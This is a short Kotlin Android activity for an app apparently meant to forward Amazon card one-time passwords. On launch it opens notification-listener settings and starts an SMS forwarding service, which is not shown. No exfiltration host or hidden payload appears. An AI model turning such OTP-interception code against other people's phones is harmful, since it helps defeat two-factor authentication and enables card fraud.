package com.example.fwdamazoncardotp

import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
        startActivity(intent)

        // Start SMS forwarding service
        val serviceIntent = Intent(this, SMSForwardService::class.java)

        // For Android 8.0 (API 26+) use startForegroundService
        startForegroundService(serviceIntent)
    }
}
